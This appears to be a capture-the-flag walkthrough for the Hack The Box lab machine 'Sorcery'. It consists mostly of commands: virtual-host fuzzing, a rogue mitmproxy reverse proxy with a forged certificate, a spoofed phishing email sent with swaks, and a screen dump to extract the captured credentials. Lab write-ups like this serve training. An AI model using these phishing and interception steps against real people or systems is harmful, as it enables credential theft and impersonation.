---
layout: default
title: Sorcery
platform: Hack The Box
---

Add the IPs to `/etc/hosts`:

<pre><code><span style="color:#ffffff">10.10.11.73 sorcery.htb git.sorcery.htb
10.10.14.40 pwn.sorcery.htb</span></code></pre>

Visit [https://sorcery.htb](https://sorcery.htb) and enumerate the repository:

<pre><code><span style="color:#00ff00">git</span><span style="color:#ffffff"> clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git</span></code></pre>

Enumerate virtual hosts with `ffuf`:

<pre><code><span style="color:#00ff00">ffuf</span><span style="color:#ffffff"> -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H </span><span style="color:#ffd700">"Host: FUZZ.sorcery.htb"</span><span style="color:#ffffff"> -mc 200</span></code></pre>

This reveals `git.sorcery.htb`; add it to `/etc/hosts` and create an account on the site, then log in.

Capture traffic with a rogue host and `mitmproxy`:

<pre><code><span style="color:#00ff00">sudo</span><span style="color:#ffffff"> </span><span style="color:#00ff00">mitmproxy</span><span style="color:#ffffff"> --mode reverse:https://git.sorcery.htb --certs pwn.sorcery.htb.pem -k -p 443</span></code></pre>

Send a phishing email to capture credentials:

<pre><code><span style="color:#00ff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf </span><span style="color:#00ff00">swaks</span><span style="color:#ffffff"> --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data </span><span style="color:#ffd700">"Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>

Extract the captured credentials from the proxied session:

<pre><code><span style="color:#00ff00">magick</span><span style="color:#ffffff"> xwd:Xvfb_screen0 credentials.png
</span><span style="color:#00ff00">open</span><span style="color:#ffffff"> credentials.png</span></code></pre>

*Screenshots omitted.*
